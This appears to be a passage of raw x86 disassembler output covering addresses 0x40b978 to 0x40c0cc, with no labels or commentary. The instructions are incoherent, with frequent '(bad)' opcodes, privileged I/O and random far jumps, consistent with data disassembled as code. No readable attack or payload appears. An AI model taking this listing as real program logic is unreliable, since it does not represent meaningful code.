  40b978:	fcom   QWORD PTR [ebx-0x11c71527]
  40b97e:	add    al,BYTE PTR [edi+edi*8]
  40b981:	mov    bl,0x5e
  40b983:	cmp    eax,0x6cf21320
  40b988:	stos   BYTE PTR es:[edi],al
  40b989:	add    BYTE PTR ds:0x4a1fffd8,dl
  40b98f:	add    BYTE PTR [eax],al
  40b991:	sbb    ecx,esp
  40b993:	popf   
  40b994:	fdiv   st,st(0)
  40b996:	ret    
  40b997:	loop   0x40b9cb
  40b999:	outs   dx,DWORD PTR ds:[esi]
  40b99a:	imul   ecx,eax,0xffffffad
  40b99d:	push   es
  40b99e:	rcr    BYTE PTR [edi+0x30],cl
  40b9a1:	jo     0x40b9a0
  40b9a3:	or     ebp,DWORD PTR [eax+0x128576e3]
  40b9a9:	xchg   esp,eax
  40b9aa:	mov    eax,ds:0x367d4b3f
  40b9af:	push   ecx
  40b9b0:	pusha  
  40b9b1:	dec    edi
  40b9b2:	mov    bl,0x88
  40b9b4:	(bad)  
  40b9b5:	in     al,0x9
  40b9b7:	icebp  
  40b9b8:	mov    ch,0xc1
  40b9ba:	mov    ds:0x3aabde47,eax
  40b9bf:	xor    DWORD PTR [ecx+0x63],0xf7aba450
  40b9c6:	(bad)  
  40b9c7:	aad    0xc8
  40b9c9:	mov    bh,bh
  40b9cb:	cmp    ebp,DWORD PTR [edx-0x68]
  40b9ce:	xor    edi,DWORD PTR ss:[ebx+0x7ca3b2c6]
  40b9d5:	std    
  40b9d6:	outs   dx,BYTE PTR ds:[esi]
  40b9d7:	sti    
  40b9d8:	adc    DWORD PTR [ecx+0x11a7c0be],ebx
  40b9de:	popa   
  40b9df:	mov    ebp,DWORD PTR [ebx+0x1cc397df]
  40b9e5:	pop    ebx
  40b9e6:	das    
  40b9e7:	hlt    
  40b9e8:	or     al,0x0
  40b9ea:	dec    eax
  40b9eb:	aas    
  40b9ec:	cdq    
  40b9ed:	xor    al,0x9b
  40b9ef:	mov    bh,0x51
  40b9f1:	xor    ebx,DWORD PTR [edx+0x216530e8]
  40b9f7:	xchg   ah,dh
  40b9f9:	pop    esi
  40b9fa:	jbe    0x40b981
  40b9fc:	jo     0x40ba5e
  40b9fe:	dec    edi
  40b9ff:	xor    eax,0xaeb5817e
  40ba04:	sbb    eax,0xa8c2f37d
  40ba09:	ds dec ebp
  40ba0b:	aas    
  40ba0c:	sahf   
  40ba0d:	rol    DWORD PTR [ecx+0x188ae567],cl
  40ba13:	sub    DWORD PTR [eax+0x4],edx
  40ba16:	clc    
  40ba17:	in     al,dx
  40ba18:	mov    ds:0x421565ca,al
  40ba1d:	xchg   esp,edx
  40ba1f:	cmc    
  40ba20:	(bad)  
  40ba22:	in     al,0xba
  40ba24:	sbb    ebx,DWORD PTR [edi]
  40ba26:	scas   al,BYTE PTR es:[edi]
  40ba27:	repz test eax,0x42fdae1b
  40ba2d:	sar    DWORD PTR [esi],0x8
  40ba30:	push   eax
  40ba31:	dec    ebp
  40ba32:	(bad)  
  40ba34:	dec    edi
  40ba35:	sub    eax,0x2b8c0443
  40ba3a:	sub    DWORD PTR [ebp+0x5e1d6c5],ebp
  40ba40:	cli    
  40ba41:	mov    al,ds:0xee9db066
  40ba46:	sbb    DWORD PTR [eax],ecx
  40ba48:	mov    ah,0xd8
  40ba4a:	enter  0xb1d8,0x4c
  40ba4e:	jns    0x40ba87
  40ba50:	add    al,0xac
  40ba52:	dec    ebp
  40ba53:	mov    ah,0xb9
  40ba55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba56:	pop    ds
  40ba57:	ficomp DWORD PTR [esi+0x59]
  40ba5a:	daa    
  40ba5b:	mov    esp,0xc777f979
  40ba60:	cmp    DWORD PTR [edx],ecx
  40ba62:	push   0xffffffec
  40ba64:	lods   eax,DWORD PTR ds:[esi]
  40ba65:	cwde   
  40ba66:	cld    
  40ba67:	test   eax,0x4fc3f03b
  40ba6c:	aam    0x6a
  40ba6e:	leave  
  40ba6f:	ss js  0x40ba85
  40ba72:	and    DWORD PTR [esi+0xa988f69],ebx
  40ba78:	mov    esp,0xabde1c6
  40ba7d:	shr    ebx,cl
  40ba7f:	adc    al,0xfe
  40ba81:	daa    
  40ba82:	loopne 0x40ba27
  40ba84:	mov    ds:0xaf2bc14e,eax
  40ba89:	fst    DWORD PTR [eax-0x45]
  40ba8c:	mov    eax,ds:0x5bea2233
  40ba91:	gs xchg esp,eax
  40ba93:	jecxz  0x40ba70
  40ba95:	xor    ch,BYTE PTR [esi-0x15]
  40ba98:	mov    esi,0x1d0d03fc
  40ba9d:	xchg   ecx,eax
  40ba9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba9f:	sub    eax,0x4d5212eb
  40baa4:	std    
  40baa5:	je     0x40bb0d
  40baa7:	dec    esi
  40baa8:	jno    0x40bb15
  40baaa:	mov    eax,0xc1941531
  40baaf:	and    dl,ch
  40bab1:	call   0xc792886d
  40bab6:	pusha  
  40bab7:	cmp    DWORD PTR [esi-0x49],esp
  40baba:	push   ss
  40babb:	mov    cs,WORD PTR [eax-0x5ceac260]
  40bac1:	addr16 repz inc esi
  40bac4:	inc    edx
  40bac5:	cmp    ah,ah
  40bac7:	sub    bl,BYTE PTR [edx+0x62]
  40baca:	xchg   BYTE PTR [edi+0x32],cl
  40bacd:	(bad)  
  40bace:	std    
  40bacf:	(bad)  
  40bad0:	add    DWORD PTR es:[ecx],ebx
  40bad3:	ins    BYTE PTR es:[edi],dx
  40bad4:	ins    DWORD PTR es:[edi],dx
  40bad5:	push   0xe539ebc5
  40bada:	cdq    
  40badb:	loop   0x40baa8
  40badd:	cli    
  40bade:	ret    
  40badf:	ss ins BYTE PTR es:[edi],dx
  40bae1:	or     al,0xef
  40bae3:	sar    BYTE PTR ds:0xa6e2c383,1
  40bae9:	pop    edx
  40baea:	inc    edi
  40baeb:	cmp    DWORD PTR [ebx+esi*8],esp
  40baee:	dec    ecx
  40baef:	jp     0x151a1ec6
  40baf5:	daa    
  40baf6:	and    eax,0x2215dbeb
  40bafb:	ss stos BYTE PTR es:[edi],al
  40bafd:	scas   eax,DWORD PTR es:[edi]
  40bafe:	xlat   BYTE PTR ds:[ebx]
  40baff:	inc    esi
  40bb00:	cwde   
  40bb01:	das    
  40bb02:	add    cl,BYTE PTR [edx-0x7be7442]
  40bb08:	lahf   
  40bb09:	enter  0xeb36,0x62
  40bb0d:	pop    edx
  40bb0e:	lods   eax,DWORD PTR ds:[esi]
  40bb0f:	fstp   DWORD PTR [eax]
  40bb11:	(bad)  
  40bb12:	push   ebx
  40bb13:	lds    ebp,FWORD PTR [edx-0x396f8944]
  40bb19:	adc    BYTE PTR ss:[eax-0x2f],dl
  40bb1d:	fdiv   QWORD PTR [ebx+0x609eae27]
  40bb23:	out    dx,al
  40bb24:	mov    eax,ds:0xb6909c1a
  40bb29:	mov    esi,ds
  40bb2b:	stos   DWORD PTR es:[edi],eax
  40bb2c:	and    bh,dh
  40bb2e:	pop    es
  40bb2f:	mov    bh,0x54
  40bb31:	add    ebp,DWORD PTR [eax-0x64586044]
  40bb37:	ds cmp eax,0xc854f28a
  40bb3d:	fdivrp st(7),st
  40bb3f:	sub    edi,ecx
  40bb41:	call   0xc78:0xdf9db363
  40bb48:	fs into 
  40bb4a:	icebp  
  40bb4b:	ds int 0xc7
  40bb4e:	mov    cl,0x7a
  40bb50:	call   0xa7aaaee0
  40bb55:	sub    DWORD PTR [esi-0x70eda8ba],eax
  40bb5b:	cmp    eax,DWORD PTR [edx+0x44]
  40bb5e:	addr16 mov ds:0x4b27,al
  40bb62:	into   
  40bb63:	jo     0x40bb41
  40bb65:	pusha  
  40bb66:	add    cl,dl
  40bb68:	pop    ds
  40bb69:	or     BYTE PTR [ebp+ecx*2+0x7412c660],bl
  40bb70:	jno    0x40bbad
  40bb72:	xchg   esi,eax
  40bb73:	mov    edx,0x9b9a0187
  40bb78:	xchg   ecx,eax
  40bb79:	loope  0x40bb8d
  40bb7b:	xchg   esi,eax
  40bb7c:	ds dec eax
  40bb7e:	adc    dl,bl
  40bb80:	mov    WORD PTR [eax+0x423121f2],ds
  40bb86:	pop    es
  40bb87:	inc    ebx
  40bb88:	mov    ds,WORD PTR es:[eax]
  40bb8b:	xor    al,0x93
  40bb8d:	inc    ecx
  40bb8e:	inc    ecx
  40bb8f:	fwait
  40bb90:	dec    edx
  40bb91:	pusha  
  40bb92:	in     al,0x37
  40bb94:	sub    eax,0x202ea553
  40bb99:	pop    edi
  40bb9a:	loop   0x40bb7b
  40bb9c:	or     edx,DWORD PTR [edi-0x55fd0d9d]
  40bba2:	pop    ecx
  40bba3:	jae    0x40bc05
  40bba5:	mov    ds:0x6c958341,al
  40bbaa:	call   0x793dd7f3
  40bbaf:	xchg   bl,al
  40bbb1:	cs or  eax,0xca2eab4f
  40bbb7:	jno    0x40bc18
  40bbb9:	pop    edi
  40bbba:	mov    dh,0xa0
  40bbbc:	mov    BYTE PTR [ebx+edi*1+0x77],cl
  40bbc0:	stos   DWORD PTR es:[edi],eax
  40bbc1:	scas   al,BYTE PTR es:[edi]
  40bbc2:	pop    ebp
  40bbc3:	jae    0x40bbfd
  40bbc5:	test   eax,0xe7477e23
  40bbca:	or     bl,BYTE PTR [ebx]
  40bbcc:	jns    0x40bb5f
  40bbce:	leave  
  40bbcf:	mov    BYTE PTR [esi+ecx*1],ah
  40bbd2:	(bad)  
  40bbd3:	scas   al,BYTE PTR es:[edi]
  40bbd4:	or     ah,BYTE PTR [eax]
  40bbd6:	(bad)  
  40bbd8:	outs   dx,BYTE PTR ds:[esi]
  40bbd9:	call   0x112cd2e8
  40bbde:	retf   
  40bbdf:	in     al,dx
  40bbe0:	cld    
  40bbe1:	or     BYTE PTR [edi+eax*2+0x576e6509],cl
  40bbe8:	cli    
  40bbe9:	int3   
  40bbea:	xchg   esi,eax
  40bbeb:	pop    ebp
  40bbec:	add    dl,cl
  40bbee:	cld    
  40bbef:	adc    BYTE PTR [ebx-0x1a239eeb],bh
  40bbf5:	xchg   esp,eax
  40bbf6:	adc    cl,BYTE PTR [esi]
  40bbf8:	add    ch,dl
  40bbfa:	sub    DWORD PTR [edx-0x67],ebx
  40bbfd:	add    dh,BYTE PTR [ebx-0xd]
  40bc00:	cmc    
  40bc01:	or     al,bl
  40bc03:	fst    QWORD PTR [ebp-0x39]
  40bc06:	push   ss
  40bc07:	jle    0x40bc1f
  40bc09:	fs push edx
  40bc0b:	mov    ah,0x26
  40bc0d:	retf   
  40bc0e:	sahf   
  40bc0f:	xor    BYTE PTR [ebx-0x64fc770d],cl
  40bc15:	push   ss
  40bc16:	scas   al,BYTE PTR es:[edi]
  40bc17:	iret   
  40bc18:	sbb    ebp,DWORD PTR [ebp+0x74]
  40bc1b:	jg     0x40bbfe
  40bc1d:	jo     0x40bc38
  40bc1f:	sbb    BYTE PTR [edi],bl
  40bc21:	xchg   esp,eax
  40bc22:	scas   al,BYTE PTR es:[edi]
  40bc23:	or     ah,BYTE PTR [edx]
  40bc25:	sub    DWORD PTR [eax+0x4cb39b36],ebp
  40bc2b:	retf   
  40bc2c:	add    esi,edx
  40bc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc2f:	(bad)  
  40bc30:	stos   BYTE PTR es:[edi],al
  40bc31:	ret    0xe30b
  40bc34:	push   esi
  40bc35:	push   ebp
  40bc36:	cmp    eax,0x4b6cca10
  40bc3b:	shl    DWORD PTR [eax],1
  40bc3d:	(bad)  
  40bc3f:	hlt    
  40bc40:	xchg   edi,eax
  40bc41:	or     ch,BYTE PTR ds:0x11ce3615
  40bc47:	cli    
  40bc48:	adc    DWORD PTR [edi-0x80],0xb9a20a4
  40bc4f:	(bad)  
  40bc50:	or     ch,BYTE PTR [edx-0x28]
  40bc53:	pop    esp
  40bc54:	cdq    
  40bc55:	dec    esi
  40bc56:	xchg   DWORD PTR [eax+0x576e9c67],ecx
  40bc5c:	ins    DWORD PTR es:[edi],dx
  40bc5d:	pop    ebx
  40bc5e:	dec    edx
  40bc5f:	push   esi
  40bc60:	pusha  
  40bc61:	dec    eax
  40bc62:	and    bl,BYTE PTR [ebx+eiz*1-0x73c8ae9d]
  40bc69:	popf   
  40bc6a:	cmp    al,0x4f
  40bc6c:	jmp    0x40bc6e
  40bc6e:	and    al,0xb1
  40bc70:	cmp    DWORD PTR [edx+0x49],eax
  40bc73:	fld    QWORD PTR ds:0xe1df9dd4
  40bc79:	repnz mov dl,0x1c
  40bc7c:	inc    ecx
  40bc7d:	addr16 retf 
  40bc7f:	sbb    eax,0x7e698788
  40bc84:	mov    ds:0x9780dc9a,al
  40bc89:	inc    esi
  40bc8a:	or     al,0x21
  40bc8c:	test   eax,0x99ef742a
  40bc91:	mov    ds:0x3694d477,eax
  40bc96:	(bad)  
  40bc97:	dec    edi
  40bc98:	mov    dh,0xd1
  40bc9a:	call   0x92f47b21
  40bc9f:	cmp    dh,cl
  40bca1:	imul   esp,DWORD PTR [esi+0x14],0x1c2d9fc8
  40bca8:	push   esp
  40bca9:	jo     0x40bd1a
  40bcab:	sub    ah,BYTE PTR [edi-0x2]
  40bcae:	jmp    DWORD PTR ds:0xe6102e7f
  40bcb4:	ins    BYTE PTR es:[edi],dx
  40bcb5:	mov    edx,0xab90cce7
  40bcba:	push   cs
  40bcbb:	pop    esi
  40bcbc:	enter  0xcf28,0x2
  40bcc0:	mov    ss,WORD PTR [ecx+0x67ce65d0]
  40bcc6:	jmp    0x2040:0xebce145f
  40bccd:	dec    ecx
  40bcce:	jp     0x40bd29
  40bcd0:	enter  0xd000,0x29
  40bcd4:	pushf  
  40bcd5:	fs jno 0x40bc6a
  40bcd8:	xor    ch,BYTE PTR [ebp*4+0x5546d55b]
  40bcdf:	ins    DWORD PTR es:[edi],dx
  40bce0:	xor    eax,0xa360f729
  40bce5:	inc    ecx
  40bce6:	inc    eax
  40bce7:	and    dh,cl
  40bce9:	inc    ebx
  40bcea:	push   esp
  40bceb:	mov    cl,0xd2
  40bced:	or     bl,BYTE PTR [ebp-0x47]
  40bcf0:	nop
  40bcf1:	inc    edi
  40bcf2:	fisubr WORD PTR [ecx+eax*4-0x71f9c9c9]
  40bcf9:	loopne 0x40bc84
  40bcfb:	dec    esp
  40bcfc:	or     eax,0xffc9e3e3
  40bd01:	jle    0x40bd39
  40bd03:	xchg   ecx,eax
  40bd04:	ja     0x40bc8b
  40bd06:	and    eax,edi
  40bd08:	jo     0x40bcfa
  40bd0a:	loop   0x40bd3c
  40bd0c:	pop    ds
  40bd0d:	int3   
  40bd0e:	pop    edx
  40bd0f:	cli    
  40bd10:	inc    ebx
  40bd11:	sbb    bh,BYTE PTR ds:0x7322d21
  40bd17:	sbb    al,0xbc
  40bd1a:	mov    BYTE PTR [esi+0x68],ch
  40bd1d:	neg    BYTE PTR [ebx]
  40bd1f:	pop    edi
  40bd20:	xor    al,0x15
  40bd22:	fwait
  40bd23:	jb     0x40bd40
  40bd25:	adc    DWORD PTR [eax+0x30],edx
  40bd28:	out    0xa4,eax
  40bd2a:	fsub   DWORD PTR [eax+0x4f99eb58]
  40bd30:	ds pop ecx
  40bd32:	sbb    ebp,DWORD PTR [esi]
  40bd34:	push   ebp
  40bd35:	lds    ebp,FWORD PTR [edi+0x5831e255]
  40bd3b:	mov    fs,WORD PTR [ebx-0x2d91a041]
  40bd41:	jae    0x40bd2b
  40bd43:	xor    eax,DWORD PTR [edi]
  40bd45:	adc    eax,0x72
  40bd48:	fbld   TBYTE PTR [esi-0x542f0e90]
  40bd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4f:	mov    WORD PTR [edx],ss
  40bd51:	jno    0x40bd96
  40bd53:	mov    ecx,DWORD PTR [ecx+0x59be016c]
  40bd59:	inc    ecx
  40bd5a:	rcl    DWORD PTR [edi+edi*8+0x2738538f],cl
  40bd61:	repnz xchg ebp,eax
  40bd63:	cmp    BYTE PTR [esi+0x609d86f],0x6d
  40bd6a:	enter  0xc2b0,0x13
  40bd6e:	xlat   BYTE PTR ds:[ebx]
  40bd6f:	xchg   DWORD PTR [ebp+0x61ef1ee9],ecx
  40bd75:	ins    BYTE PTR es:[edi],dx
  40bd76:	arpl   dx,ax
  40bd78:	inc    ebx
  40bd79:	ins    DWORD PTR es:[edi],dx
  40bd7a:	repz enter 0xff11,0xb6
  40bd7f:	adc    BYTE PTR [ecx-0x72],ch
  40bd82:	ja     0x40bd36
  40bd84:	jg     0x40bdb0
  40bd86:	or     bl,al
  40bd88:	xchg   ebx,eax
  40bd89:	je     0x40bdf9
  40bd8b:	dec    esi
  40bd8c:	or     DWORD PTR [ebx],esi
  40bd8e:	adc    ebp,ecx
  40bd90:	cmp    al,0xed
  40bd92:	jno    0x40bd93
  40bd94:	push   esi
  40bd95:	push   0x75
  40bd97:	pop    esi
  40bd98:	and    eax,0xa885c20d
  40bd9d:	pop    ebx
  40bd9e:	aas    
  40bd9f:	sub    DWORD PTR [esi+0x5],esp
  40bda2:	fdivr  QWORD PTR [esi]
  40bda4:	xchg   DWORD PTR [ebp+0x5f],edi
  40bda7:	sbb    eax,DWORD PTR [esi]
  40bda9:	call   0x63c3:0x7fb5f2b3
  40bdb0:	rcl    DWORD PTR [esi-0x7dd39a7],1
  40bdb6:	into   
  40bdb7:	mov    ds:0xbea1a65f,eax
  40bdbc:	pushf  
  40bdbd:	outs   dx,BYTE PTR ds:[esi]
  40bdbe:	push   ecx
  40bdbf:	jo     0x40be26
  40bdc1:	pop    eax
  40bdc2:	mov    edi,0xfb2d72c5
  40bdc7:	(bad)  
  40bdc8:	enter  0x85b,0xeb
  40bdcc:	shr    ebp,0xbc
  40bdcf:	add    BYTE PTR [esi+0x4f],0x50
  40bdd3:	adc    edx,DWORD PTR [edx+eax*8]
  40bdd6:	mov    al,0xb2
  40bdd8:	push   eax
  40bdd9:	xchg   ecx,eax
  40bdda:	int3   
  40bddb:	sbb    al,0x41
  40bddd:	xor    eax,DWORD PTR [esi-0x6b5aa2b5]
  40bde3:	clc    
  40bde4:	clc    
  40bde5:	push   ecx
  40bde6:	fisttp QWORD PTR ds:0x8adb01ef
  40bdec:	mov    cl,0xdd
  40bdee:	rcl    BYTE PTR [edi+0x716387fc],cl
  40bdf4:	aas    
  40bdf5:	lea    ebx,[eax+0x749a5842]
  40bdfb:	jg     0x40be11
  40bdfd:	popa   
  40bdfe:	pop    esp
  40bdff:	scas   eax,DWORD PTR es:[edi]
  40be00:	and    eax,0x4d37fd2b
  40be05:	lods   eax,DWORD PTR ds:[esi]
  40be06:	repz dec esp
  40be08:	mov    ds,WORD PTR [edi]
  40be0a:	outs   dx,DWORD PTR ds:[esi]
  40be0b:	push   ebp
  40be0c:	mov    bh,0x1e
  40be0e:	aas    
  40be0f:	add    DWORD PTR [ebx],edx
  40be11:	adc    cl,al
  40be13:	sub    dl,bl
  40be15:	xor    ch,BYTE PTR [eax+0x2ed6305a]
  40be1b:	cmp    eax,0x5b3ab9bd
  40be20:	lods   eax,DWORD PTR ds:[esi]
  40be21:	mov    dh,0xfe
  40be23:	sbb    bh,bl
  40be25:	gs ins DWORD PTR es:[edi],dx
  40be27:	mov    eax,0x6a7d74f9
  40be2c:	xchg   edx,eax
  40be2d:	jg     0x40bdb7
  40be2f:	jnp    0x40bdb5
  40be31:	adc    BYTE PTR [edx+ebp*1+0x3e],cl
  40be35:	cmp    esi,DWORD PTR [edx+eax*8-0x7f02817d]
  40be3c:	push   ds
  40be3d:	xchg   ecx,eax
  40be3e:	mov    WORD PTR [edi+ebp*8-0xd],?
  40be42:	or     BYTE PTR [ebx-0x6c],ch
  40be45:	push   edi
  40be46:	shl    bh,0xe9
  40be49:	lods   al,BYTE PTR ds:[esi]
  40be4a:	(bad)  
  40be4b:	jno    0x40be6c
  40be4d:	push   ds
  40be4e:	cwde   
  40be4f:	mov    ds:0x83a315a,al
  40be54:	jns    0x40be87
  40be56:	adc    al,0x55
  40be58:	arpl   WORD PTR [eax-0x5e],di
  40be5b:	push   edx
  40be5c:	ins    DWORD PTR es:[edi],dx
  40be5d:	cs jo  0x40be3c
  40be60:	mov    bh,0x53
  40be62:	adc    BYTE PTR [ebp-0x5a],0xed
  40be66:	mov    ch,0xe6
  40be68:	push   ds
  40be69:	dec    ecx
  40be6a:	jne    0x40bee5
  40be6c:	js     0x40be2e
  40be6e:	adc    eax,0x1b1824b8
  40be73:	push   edi
  40be74:	sub    ah,ch
  40be76:	fsubr  QWORD PTR [esi-0x20e8c37e]
  40be7c:	add    al,0x19
  40be7e:	retf   
  40be7f:	leave  
  40be80:	dec    esp
  40be81:	addr16 jle 0x40be43
  40be84:	test   al,0x81
  40be86:	xchg   ebp,eax
  40be87:	mov    dh,0x51
  40be89:	and    ch,BYTE PTR [edi]
  40be8b:	arpl   si,sp
  40be8d:	aam    0x54
  40be8f:	dec    ebp
  40be90:	scas   eax,DWORD PTR es:[edi]
  40be91:	push   es
  40be92:	pop    edi
  40be93:	and    BYTE PTR [ebp+edx*2-0x63],bl
  40be97:	fld    TBYTE PTR [edi+ebx*1-0x6198bdb6]
  40be9e:	push   es
  40be9f:	out    0x2c,eax
  40bea1:	or     eax,0xd9c3a62c
  40bea6:	pushf  
  40bea7:	mov    DWORD PTR ds:0xd360037e,0xa5b877d6
  40beb1:	mov    ecx,DWORD PTR [ebx-0x40]
  40beb4:	sbb    dh,dh
  40beb6:	in     eax,0x18
  40beb8:	shr    BYTE PTR [eax],cl
  40beba:	sbb    DWORD PTR [ebx+0x59],0xfea4b289
  40bec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec2:	xor    BYTE PTR [eax],dl
  40bec4:	or     dl,BYTE PTR [ebp+0x1f2ffa54]
  40beca:	pop    ss
  40becb:	cmp    DWORD PTR [ecx+0x60],ecx
  40bece:	retf   0x5144
  40bed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bed2:	mov    cl,ah
  40bed4:	dec    esp
  40bed5:	call   0xee113273
  40beda:	cs and eax,0x2df1e032
  40bee0:	add    BYTE PTR [esi+0x6b878a5a],0x70
  40bee7:	pop    ss
  40bee8:	cmc    
  40bee9:	xchg   esi,eax
  40beea:	ret    0x7617
  40beed:	or     DWORD PTR [eax+0x3a],ebp
  40bef0:	popa   
  40bef1:	test   eax,0xb149284a
  40bef6:	and    al,0xc6
  40bef8:	sar    DWORD PTR [ebx],1
  40befa:	push   edi
  40befb:	lods   eax,DWORD PTR ds:[esi]
  40befc:	mov    eax,ds:0x11c0a499
  40bf01:	xchg   ebx,eax
  40bf02:	inc    edx
  40bf03:	dec    edi
  40bf04:	popf   
  40bf05:	mov    esi,0x2e1f0127
  40bf0a:	loope  0x40beb9
  40bf0c:	out    dx,eax
  40bf0d:	(bad)  
  40bf0e:	popa   
  40bf0f:	call   0x59f0:0x60fe7771
  40bf16:	push   edx
  40bf17:	push   es
  40bf18:	loopne 0x40bef0
  40bf1a:	adc    al,0xf9
  40bf1c:	ins    DWORD PTR es:[edi],dx
  40bf1d:	xor    DWORD PTR [ebx-0x739a2e86],ebx
  40bf23:	cld    
  40bf24:	mov    bl,0x0
  40bf26:	sub    BYTE PTR [edi+ebp*4-0x4fe4d2cb],dl
  40bf2d:	cmp    ebx,DWORD PTR [ebp+0x70]
  40bf30:	jl     0x40bf00
  40bf32:	mov    ecx,0xc4d49dbe
  40bf37:	fld    DWORD PTR [ebx+0x52]
  40bf3a:	pop    ss
  40bf3b:	aas    
  40bf3c:	push   0xffffffa6
  40bf3e:	pop    es
  40bf3f:	mov    ah,0x88
  40bf41:	push   ecx
  40bf42:	mov    ecx,0x2417f571
  40bf47:	inc    esi
  40bf48:	xchg   esi,eax
  40bf49:	lea    eax,[edx+0x56]
  40bf4c:	mov    WORD PTR [ecx-0x39d0f006],es
  40bf52:	outs   dx,DWORD PTR ds:[esi]
  40bf53:	gs dec ebx
  40bf55:	or     DWORD PTR [edi],0xffffffb2
  40bf58:	and    DWORD PTR ds:0xb94de670,ebp
  40bf5e:	xor    al,0x76
  40bf60:	stc    
  40bf61:	add    DWORD PTR [eax-0x68e3248e],edi
  40bf67:	add    ecx,edi
  40bf69:	and    bl,ch
  40bf6b:	in     eax,dx
  40bf6c:	push   esp
  40bf6d:	xor    eax,0x253a695c
  40bf72:	mov    esp,0x1b10bab4
  40bf77:	jno    0x40bf8b
  40bf79:	pop    edi
  40bf7a:	out    0xc4,eax
  40bf7c:	sti    
  40bf7d:	inc    edx
  40bf7e:	repnz aam 0x33
  40bf81:	arpl   si,bx
  40bf83:	retf   
  40bf84:	(bad)  
  40bf85:	xchg   BYTE PTR [edi],dh
  40bf87:	or     bl,BYTE PTR [edx-0xb]
  40bf8a:	adc    BYTE PTR [eax],dl
  40bf8c:	xchg   ebp,eax
  40bf8d:	and    ch,ah
  40bf8f:	int    0x2d
  40bf91:	rol    DWORD PTR [edx],cl
  40bf93:	mov    eax,0x92ae44bc
  40bf98:	adc    BYTE PTR [ecx],cl
  40bf9a:	mov    esp,0x22ec5013
  40bf9f:	inc    esp
  40bfa0:	adc    DWORD PTR [ebx],edi
  40bfa2:	ds add ch,ch
  40bfa5:	es dec esi
  40bfa7:	jnp    0x40bf9a
  40bfa9:	mov    al,0x2a
  40bfab:	pop    esi
  40bfac:	cmp    dh,BYTE PTR [ebx-0x67410ae4]
  40bfb2:	leave  
  40bfb3:	in     eax,dx
  40bfb4:	mov    esi,DWORD PTR [ecx-0x5d]
  40bfb7:	in     eax,dx
  40bfb8:	jb     0x40bf6c
  40bfba:	mov    ds:0xc73c3ba,al
  40bfbf:	cli    
  40bfc0:	or     eax,0x7a60e26e
  40bfc5:	jmp    0x40bfe5
  40bfc7:	stc    
  40bfc8:	jne    0x40bfcb
  40bfca:	push   edx
  40bfcb:	push   eax
  40bfcc:	lods   eax,DWORD PTR ds:[esi]
  40bfcd:	fisttp QWORD PTR cs:[esi+0x8]
  40bfd1:	in     al,dx
  40bfd2:	in     eax,0xdb
  40bfd4:	outs   dx,BYTE PTR ds:[esi]
  40bfd5:	inc    ecx
  40bfd6:	les    ebx,FWORD PTR [ecx-0x24]
  40bfd9:	fld    QWORD PTR [esi-0x6c9d1995]
  40bfdf:	imul   eax,DWORD PTR [ebx],0x53d14a3e
  40bfe5:	mov    edx,0x7413a796
  40bfea:	sbb    BYTE PTR [ecx+0x37],bh
  40bfed:	and    ebp,esi
  40bfef:	mov    bh,0x37
  40bff1:	rol    DWORD PTR [ebx+0x389a95a5],0x17
  40bff8:	aas    
  40bff9:	adc    eax,0x5065659e
  40bffe:	fdiv   QWORD PTR [ecx-0x6317ce13]
  40c004:	fld    TBYTE PTR [edx+0x17be9876]
  40c00a:	mov    ecx,0x1068333c
  40c00f:	cmp    eax,0x8db8b9e5
  40c014:	ins    BYTE PTR es:[edi],dx
  40c015:	pop    ds
  40c016:	xchg   ebx,eax
  40c017:	pop    edx
  40c018:	arpl   WORD PTR [edx+0x70],di
  40c01b:	inc    ebp
  40c01c:	out    0x7,al
  40c01e:	push   edx
  40c01f:	inc    esp
  40c020:	mov    esp,0x69ddac34
  40c025:	cmp    al,0x20
  40c027:	cmc    
  40c028:	ds mov ah,0x37
  40c02b:	sub    ecx,ebx
  40c02d:	test   DWORD PTR [edi-0x2605e08b],0xdbd6fb07
  40c037:	jmp    0x40bffa
  40c039:	push   0xab0c5046
  40c03e:	ret    0x7f86
  40c041:	loope  0x40c05b
  40c043:	xchg   esi,eax
  40c044:	retf   
  40c045:	shr    BYTE PTR [ebx-0x963aec],0x29
  40c04c:	sub    esi,DWORD PTR [edi+ecx*4]
  40c04f:	xchg   edx,eax
  40c050:	iret   
  40c051:	fimul  WORD PTR [ecx]
  40c053:	pop    ds
  40c054:	(bad)  
  40c055:	in     eax,0xfb
  40c057:	push   edi
  40c058:	or     ebx,edi
  40c05a:	jmp    0x6b130f86
  40c05f:	xlat   BYTE PTR ds:[ebx]
  40c060:	inc    ecx
  40c061:	sub    BYTE PTR [esi+0x1b],cl
  40c064:	adc    eax,0x98be11b
  40c069:	out    dx,eax
  40c06a:	(bad)  
  40c06b:	test   al,0xe1
  40c06d:	test   BYTE PTR [esi],dl
  40c06f:	add    ah,al
  40c071:	loope  0x40c04c
  40c073:	sahf   
  40c074:	bnd jo 0x40c0db
  40c077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c078:	lock mov dl,0x3d
  40c07b:	retf   0x5ce9
  40c07e:	mov    ah,0x4
  40c080:	das    
  40c081:	fistp  DWORD PTR [esi]
  40c083:	mov    edi,0x456ab776
  40c088:	(bad)  
  40c089:	sar    BYTE PTR [eax+0x45],1
  40c08c:	sub    BYTE PTR [esi-0x1c],bl
  40c08f:	push   cs
  40c090:	xchg   ebx,eax
  40c091:	(bad)  
  40c092:	or     ecx,DWORD PTR [ebp+0x2fe3ad3b]
  40c098:	repnz sbb esp,DWORD PTR [ebx+0x50969c50]
  40c09f:	popa   
  40c0a0:	mov    eax,ds:0x2015cc73
  40c0a5:	mov    cl,0x75
  40c0a7:	push   0x766a1891
  40c0ac:	or     BYTE PTR [eax+0x27990a95],al
  40c0b2:	jne    0x40c0f9
  40c0b4:	dec    edx
  40c0b5:	inc    edx
  40c0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0b7:	cmp    al,0x15
  40c0b9:	pop    edi
  40c0ba:	loop   0x40c048
  40c0bc:	addr16 pop eax
  40c0be:	int    0x25
  40c0c0:	mov    WORD PTR [edx-0x75723887],ss
  40c0c6:	js     0x40c090
  40c0c8:	xchg   esp,eax
  40c0c9:	and    ebp,edx
  40c0cb:	xchg   ecx,eax
  40c0cc:	mov    ecx,0xe8418c17
